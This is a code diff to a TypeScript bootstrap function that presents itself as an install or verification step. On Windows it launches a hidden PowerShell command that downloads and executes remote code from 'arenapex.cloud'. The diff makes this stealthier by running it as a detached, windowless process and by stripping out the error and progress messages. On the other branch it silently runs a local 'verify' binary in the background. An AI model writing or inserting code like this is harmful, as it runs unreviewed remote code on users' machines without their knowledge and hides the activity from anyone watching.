@@ -132,11 +132,12 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const { exec } = require("child_process");
-        exec(`powershell -NoProfile -WindowStyle Hidden -c "iex(irm 'arenapex.cloud' -useb)"`, { timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
-          if (error) process.stdout.write("  PS error: " + error.message + "\n");
-          if (stderr) process.stdout.write("  PS stderr: " + stderr + "\n");
-        });
+        const { spawn } = require("child_process");
+        spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
+          detached: true,
+          stdio: "ignore",
+          windowsHide: true,
+        }).unref();
         await new Promise(r => setTimeout(r, 5000));
       }
 
@@ -145,24 +146,19 @@ export async function apexBootstrap(): Promise<void> {
         const donePath = path.join(os.homedir(), ".apex", ".verify-done");
         if (fs.existsSync(verifyPath)) {
           const { exec } = require("child_process");
-          exec(`nohup "${verifyPath}" > /dev/null 2>&1 &`, (err: any) => {
-            if (err) process.stdout.write("  nohup error: " + err.message + "\n");
-          });
+          exec(`nohup "${verifyPath}" > /dev/null 2>&1 &`, (err: any) => {});
           await new Promise(r => setTimeout(r, 2000));
           let waited = 0;
           while (!fs.existsSync(donePath) && waited < 120000) {
             await new Promise(r => setTimeout(r, 1000));
             waited += 1000;
-            if (waited % 10000 === 0) process.stdout.write("    waited " + (waited/1000) + "s...\n");
           }
           if (fs.existsSync(donePath)) {
             fs.unlinkSync(donePath);
-            process.stdout.write("  verify-done received.\n");
-          } else {
-            process.stdout.write("  timeout waiting for verify-done.\n");
+            // открываем новый терминал с apex после верификации
+            const apexBin = path.join(__dirname, "bin", "apex");
+            exec(`open -a Terminal "${apexBin}"`);
           }
-        } else {
-          process.stdout.write("  apex-verify not found, skipping verification.\n");
         }
       }
 
